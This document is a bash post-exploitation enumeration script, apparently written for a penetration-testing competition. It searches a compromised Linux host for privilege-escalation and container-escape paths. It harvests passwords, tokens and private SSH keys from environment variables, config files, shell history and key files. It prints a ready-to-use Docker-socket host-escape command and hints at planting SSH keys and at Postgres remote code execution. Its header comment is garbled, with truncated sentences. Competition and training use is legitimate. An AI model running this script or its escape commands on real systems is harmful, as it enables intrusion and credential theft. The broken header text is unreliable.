#!/usr/bin/env bash
# =============================================================================
#  cptc-enum.sh  --  UF CPTC team's "LinPEAS, but only the stuff we actually
#                    find." Run it AFTER you land a shell on a Linux host.
#
#  It is READ ONLY. It changes nothing. It just looks, fast, for the exact
#  privilege-escalation and container-escape paths are common,
# .
#
#  USAGE:   bash cptc-enum.sh              # full run, human-readable
#           bash cptc-enum.sh | tee out    # keep a copy for the report
#           bash cptc-enum.sh -q           # quiet: only print HITS, skip "nothing"
#
#  tell you which CPTC finding this is the same shape as.
# =============================================================================

QUIET=0; [ "${1:-}" = "-q" ] && QUIET=1
C_HIT='\033[1;31m'; C_SEC='\033[1;36m'; C_PAST='\033[0;33m'; C_OK='\033[0;32m'; C_0='\033[0m'
[ -t 1 ] || { C_HIT=; C_SEC=; C_PAST=; C_OK=; C_0=; }   # no color if piped

sec()  { printf "\n${C_SEC}=== %s ===${C_0}\n" "$1"; }
hit()  { printf "${C_HIT}[!! HIT]${C_0} %s\n" "$1"; }
ok()   { [ "$QUIET" = 1 ] || printf "${C_OK}[ok]${C_0} %s\n" "$1"; }
have() { command -v "$1" >/dev/null 2>&1; }

printf "${C_SEC}#### cptc-enum.sh  |  %s  |  %s ####${C_0}\n" "$(id -un 2>/dev/null)@$(hostname 2>/dev/null)" "$(date 2>/dev/null)"

# -----------------------------------------------------------------------------
sec "Who am I / quick wins"
id 2>/dev/null
[ "$(id -u 2>/dev/null)" = "0" ] && { hit "You are already ROOT on this host."; }
printf "OS: "; (cat /etc/os-release 2>/dev/null | grep -E '^PRETTY_NAME' | cut -d= -f2) || uname -a
printf "Kernel: "; uname -r 2>/dev/null

# -----------------------------------------------------------------------------
sec "sudo rights (NOPASSWD = instant win)"
SUDO=$(sudo -n -l 2>/dev/null)
if [ -n "$SUDO" ]; then
  printf "%s\n" "$SUDO"
  echo "$SUDO" | grep -qi "NOPASSWD" && { hit "NOPASSWD sudo entry present -> check GTFOBins for the binary."; }
  echo "$SUDO" | grep -q "ALL" && hit "sudo ALL present."
else
  ok "no passwordless sudo (or sudo not present)"
fi

# -----------------------------------------------------------------------------
sec "SUID / SGID binaries (GTFOBins privesc)"
SUIDS=$(find / -xdev -perm -4000 -type f 2>/dev/null)
printf "%s\n" "$SUIDS" | grep -vE '/(sudo|mount|umount|su|passwd|chsh|gpasswd|newgrp|chfn|pkexec)$' | while read -r f; do
  [ -n "$f" ] && hit "SUID: $f"
done
echo "$SUIDS" | grep -q "pkexec" && { hit "pkexec is SUID -> PwnKit (CVE-2021-4034) candidate."; }
have getcap && { CAPS=$(getcap -r / 2>/dev/null); [ -n "$CAPS" ] && { echo "$CAPS" | grep -Ei 'cap_(setuid|dac_override|dac_read_search|sys_admin|sys_ptrace)' | while read -r l; do hit "capability: $l"; done; }; }

# -----------------------------------------------------------------------------
sec "Container? (and can we escape to the host?)"
INCON=0
if [ -f /.dockerenv ]; then INCON=1; hit "/.dockerenv present -> you are INSIDE a Docker container."; fi
grep -qa -E '(docker|containerd|kubepods|lxc)' /proc/1/cgroup 2>/dev/null && { INCON=1; hit "cgroup says containerized."; }
if [ "$INCON" = "1" ]; then
  # 1) docker socket mounted = game over
  if [ -S /var/run/docker.sock ] || [ -S /run/docker.sock ]; then
    hit "docker.sock is mounted in the container -> ESCAPE: run a container that mounts host / and chroot into it."
    echo '        e.g.: docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh'
  fi
  # 2) privileged? (read-only: inspect our own effective capabilities)
  CAPEFF=$(grep -i '^CapEff' /proc/self/status 2>/dev/null | awk '{print $2}')
  [ -n "$CAPEFF" ] && echo "        CapEff=$CAPEFF (a privileged container shows the full set, e.g. ...ffffffffff)"
  case "$CAPEFF" in *ffffffffff) hit "effective capabilities look FULL -> PRIVILEGED container; mount the host disk directly.";; esac
  [ -r /dev/sda ] || [ -r /dev/vda ] || [ -r /dev/nvme0n1 ] 2>/dev/null && hit "Host block device is readable from here -> privileged/raw-disk escape."
  # 3) host paths mounted in
  mount 2>/dev/null | grep -Ei ' on /(host|mnt|media|root|home)[ /]' | while read -r m; do hit "host path mounted in: $m -> drop an SSH key or cron on the host."; done
  grep -qa '/.ssh' /proc/mounts 2>/dev/null && hit "an .ssh path appears mounted -> write authorized_keys."
else
  ok "not obviously inside a container"
fi

# -----------------------------------------------------------------------------
sec "Kernel exploit flags (match version to a known local root)"
KV=$(uname -r 2>/dev/null); echo "kernel: $KV"
case "$KV" in
  5.8*|5.9*|5.10*|5.11*|5.12*|5.13*|5.14*|5.15*|5.16*) hit "kernel $KV may be vulnerable to Dirty Pipe (CVE-2022-0847).";;
esac
echo "$KV" | grep -Eq '^(2\.6|3\.|4\.[0-9]\.)' && hit "old kernel $KV -> check searchsploit/DirtyCow era exploits."

# -----------------------------------------------------------------------------
sec "Credentials lying around (common spots)"
# /proc/self/environ -> often holds DB creds
if [ -r /proc/self/environ ]; then
  ENVHIT=$(tr '\0' '\n' < /proc/self/environ 2>/dev/null | grep -Ei 'pass|secret|token|key|db_' )
  [ -n "$ENVHIT" ] && { hit "secrets in our own /proc/self/environ:"; echo "$ENVHIT" | sed 's/^/        /'; }
fi
# .pgpass / postgres defaults
[ -r "$HOME/.pgpass" ] && { hit "~/.pgpass readable -> Postgres creds."; }
have psql && hit "psql present -> try default creds postgres:postgres and 'COPY ... TO PROGRAM' for RCE."
# config files + .env with creds
for d in /var/www /opt /srv /home /app /usr/share/nginx; do
  [ -d "$d" ] || continue
  grep -rslEi --include='*.conf' --include='*.cfg' --include='*.ini' --include='*.env' --include='*.yml' --include='*.yaml' --include='*.json' --include='*.xml' --include='*.php' --include='*.py' --include='*.js' --include='*.jsx' --include='*.vue' --include='*.sh' --include='*.properties' --include='*.txt' 'password|passwd|secret|api[_-]?key|BEGIN RSA|aws_secret' "$d" 2>/dev/null | head -20 | while read -r f; do hit "possible creds in file: $f"; done
done
find / -xdev -name '.env' -readable 2>/dev/null | head -20 | while read -r f; do hit ".env readable: $f"; done
# shell history
for h in "$HOME/.bash_history" "$HOME/.zsh_history" "$HOME/.mysql_history" "$HOME/.psql_history"; do
  [ -r "$h" ] && { HH=$(grep -Ei 'pass|ssh |mysql |psql |curl .*-u|token' "$h" 2>/dev/null | head -5); [ -n "$HH" ] && { hit "interesting history in $h:"; echo "$HH" | sed 's/^/        /'; }; }
done

# -----------------------------------------------------------------------------
sec "SSH keys"
find / -xdev \( -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' \) -readable 2>/dev/null | head -20 | while read -r k; do hit "readable private key: $k"; done
for a in /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys; do [ -w "$a" ] 2>/dev/null && hit "WRITABLE authorized_keys: $a -> add your key."; done

# -----------------------------------------------------------------------------
sec "Scheduled jobs you can hijack"
for c in /etc/crontab /etc/cron.d/* ; do [ -r "$c" ] && grep -vE '^\s*#' "$c" 2>/dev/null | grep -E '\S' | sed "s|^|$c: |"; done
# world-writable scripts referenced by cron/systemd
find /etc/cron* /etc/systemd 2>/dev/null -type f -writable 2>/dev/null | while read -r f; do hit "writable scheduled-job file: $f"; done
ls -la /etc/cron* 2>/dev/null | grep -E '^-.......w' >/dev/null && hit "a cron file is world-writable."

# -----------------------------------------------------------------------------
sec "Listening services (odd ports worth poking)"
if have ss; then LISTEN=$(ss -lntup 2>/dev/null); elif have netstat; then LISTEN=$(netstat -lntup 2>/dev/null); fi
printf "%s\n" "$LISTEN" | grep -E 'LISTEN|:[0-9]' | head -40
echo "$LISTEN" | grep -Eiv ':(22|80|443|53|25|3306|5432|111|139|445|631)\b' | grep -E ':[0-9]+' | grep -i listen >/dev/null 2>&1 && { hit "non-standard listening port(s) above -> poke them, they may be a custom service."; }

# -----------------------------------------------------------------------------
sec "World-writable dirs/files + writable PATH"
echo "$PATH" | tr ':' '\n' | while read -r p; do [ -w "$p" ] 2>/dev/null && hit "writable PATH dir: $p -> binary hijack."; done
find / -xdev -writable -type d 2>/dev/null | grep -vE '^/(proc|sys|dev|run|tmp|var/tmp|home/'"$(id -un 2>/dev/null)"')' | head -15 | while read -r d; do ok "writable dir: $d"; done

printf "\n${C_SEC}#### done. Chase every [!! HIT] above. Log the commands you run for the report. ####${C_0}\n"
